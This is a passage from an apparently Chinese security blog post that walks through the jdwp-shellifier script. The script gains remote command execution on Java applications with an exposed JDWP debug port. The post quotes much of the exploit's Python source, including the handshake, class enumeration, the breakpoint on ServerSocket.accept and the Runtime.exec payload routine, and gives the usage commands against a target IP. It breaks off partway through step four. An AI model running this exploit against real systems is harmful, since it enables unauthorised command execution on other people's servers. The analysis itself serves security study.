使用`python ./jdwp-shellifier.py -t my.target.ip -p 1234`尝试连接开启了`JDWP`协议的端口;
使用`--cmd`执行命令
    python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "touch 123.txt"
#### jdwp-shellifier分析
##### 开启调试
我们在本机开启9999的调试端口，`java -Xdebug
-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar`
#### 运行jdwp
尝试连接到本机的`9999`端口，`python2 jdwp-shellifier.py -t 127.0.0.1 -p
9999`。默认情况下，会在`java.net.ServerSocket.accept()`函数加上断点。
    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                        formatter_class=argparse.ArgumentDefaultsHelpFormatter )
       parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
       parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")
       parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                           default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
       parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                           help="Specify command to execute remotely")
       args = parser.parse_args()
       classname, meth = str2fqclass(args.break_on)
       setattr(args, "break_on_class", classname)
       setattr(args, "break_on_method", meth)
  * `break_on_class`,`'Ljava/net/ServerSocket;'`
  * `break_on_method`,`'accept'`
之后运行`start()`方法：
    def start(self):
        self.handshake(self.host, self.port)
        self.idsizes()
        self.getversion()
        self.allclasses()
        return
    cli = JDWPClient(args.target, args.port)
    cli.start()
分析`self.handshake(self.host, self.port)`的握手协议：
    HANDSHAKE                 = "JDWP-Handshake"
    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect( (host, port) )
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)
        s.send( HANDSHAKE )
        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            self.socket = s
        return
握手协议很简单，通过`socket`发送`JDWP-Handshake`包。如果相应包也是`JDWP-Handshake`表示握手成功。
    IDSIZES_SIG               = (1, 7)
    def idsizes(self):
        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
        buf = self.read_reply()
        formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.iteritems():
                setattr(self, name, value)
        return
通过向服务端发送`IDSIZES_SIG = (1,
7)`的包，然后利用`parse_entries()`方法得到一些JDWP的属性，包括`fieldIDSize`,`methodIDSize`等属性。运行完毕之后得到的属性如下：
[
之后运行`getversion()`方法，得到JVM相关的配置信息。
    def getversion(self):
        self.socket.sendall( self.create_packet(VERSION_SIG) )
        buf = self.read_reply()
        formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.iteritems():
                setattr(self, name, value)
        return
[
接下来运行
    ALLCLASSES_SIG            = (1, 3)
    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
            buf = self.read_reply()
            formats = [ ('C', "refTypeTag"),
                        (self.referenceTypeIDSize, "refTypeId"),
                        ('S', "signature"),
                        ('I', "status")]
            self.classes = self.parse_entries(buf, formats)
        return self.classes
通过`socket`发送`ALLCLASSES_SIG = (1,
3)`的包，利用`parse_entries()`解析返回包的数据，得到`refTypeTag`,`refTypeId`等信息。以下就是得到所有的结果：
[
#### runtime_exec
    def runtime_exec(jdwp, args):
        print ("[+] Targeting '%s:%d'" % (args.target, args.port))
        print ("[+] Reading settings for '%s'" % jdwp.version)
        # 1. get Runtime class reference
        runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print ("[-] Cannot find class Runtime")
            return False
        print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
        # 2. get getRuntime() meth reference
        jdwp.get_methods(runtimeClass["refTypeId"])
        getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
        if getRuntimeMeth is None:
            print ("[-] Cannot find method Runtime.getRuntime()")
            return False
        print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
        # 3. setup breakpoint on frequently called method
        c = jdwp.get_class_by_name( args.break_on_class )
        if c is None:
            print("[-] Could not access class '%s'" % args.break_on_class)
            print("[-] It is possible that this class is not used by application")
            print("[-] Test with another one with option `--break-on`")
            return False
        jdwp.get_methods( c["refTypeId"] )
        m = jdwp.get_method_by_name( args.break_on_method )
        if m is None:
            print("[-] Could not access method '%s'" % args.break_on)
            return False
        loc = chr( TYPE_CLASS )
        loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
        loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
        loc+= struct.pack(">II", 0, 0)
        data = [ (MODKIND_LOCATIONONLY, loc), ]
        rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
        print ("[+] Created break event id=%x" % rId)
        # 4. resume vm and wait for event
        jdwp.resumevm()
        print ("[+] Waiting for an event on '%s'" % args.break_on)
        while True:
            buf = jdwp.wait_for_event()
            ret = jdwp.parse_event_breakpoint(buf, rId)
            if ret is not None:
                break
        rId, tId, loc = ret
        print ("[+] Received matching event from thread %#x" % tId)
        jdwp.clear_event(EVENT_BREAKPOINT, rId)
        # 5. Now we can execute any code
        if args.cmd:
            runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
        else:
            # by default, only prints out few system properties
            runtime_exec_info(jdwp, tId)
        jdwp.resumevm()
        print ("[!] Command successfully executed")
        return True
    if runtime_exec(cli, args) == False:
        print ("[-] Exploit failed")
        retcode = 1
`runtime_exec()`此方法类似与Java反弹shell中的利用ivoke的方式得到`Runtime`对象，然后利用`Runtime`对象进一步执行命令，从而最终达到RCE。
第一步，得到`Runtime`类
    # 1. get Runtime class reference
        runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print ("[-] Cannot find class Runtime")
            return False
        print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
第二步，得到`getRuntime()`方法
    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass["refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
    if getRuntimeMeth is None:
        print ("[-] Cannot find method Runtime.getRuntime()")
        return False
    print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
以上两步的代码就类似于Java中的：
    Class cls = Class.forName("java.lang.Runtime");
    Method m = cls.getMethod("getRuntime");
第三步，得到断点设置的类和方法
     # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( args.break_on_class )
    if c is None:
        print("[-] Could not access class '%s'" % args.break_on_class)
        print("[-] It is possible that this class is not used by application")
        print("[-] Test with another one with option `--break-on`")
        return False
    jdwp.get_methods( c["refTypeId"] )
    m = jdwp.get_method_by_name( args.break_on_method )
    if m is None:
        print("[-] Could not access method '%s'" % args.break_on)
        return False
在默认情况下，`c`是`Ljava/net/ServerSocket;`,`m`是`accept`。
[
第四步，向JVM发生数据，表示需要`ServerSocket.accept()`在下断点
    loc = chr( TYPE_CLASS )
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
    loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
    loc+= struct.pack(">II", 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]